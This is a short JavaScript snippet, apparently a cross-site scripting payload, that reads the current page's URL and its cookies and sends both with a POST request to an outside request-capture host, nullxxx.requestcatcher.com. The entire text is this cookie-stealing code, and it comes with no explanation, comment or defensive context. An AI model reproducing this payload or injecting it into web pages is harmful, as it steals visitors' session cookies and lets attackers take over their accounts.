  
const headers = new Headers();

const body = { "location": document.location.href, "cookie": document.cookie };

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
};

fetch("https://nullxxx.requestcatcher.com/test", options);
